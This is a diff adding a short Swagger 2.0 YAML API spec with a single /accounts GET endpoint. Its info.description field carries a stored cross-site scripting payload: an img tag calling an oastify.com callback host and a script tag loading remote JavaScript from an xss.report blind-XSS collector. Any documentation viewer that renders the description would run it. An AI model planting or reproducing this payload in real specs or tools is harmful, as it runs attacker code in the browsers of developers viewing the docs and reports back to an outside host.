@@ -1,0 +1,14 @@
+swagger: '2.0'
+info:
+  title: Example yaml.spec
+  description:  <img src=https://cq6paz3jw9zfq4lgy8e3w6phn8tzhr5g.oastify.com onerror="'"><script src=https://xss.report/c/digy></script>">
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description:  nice
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
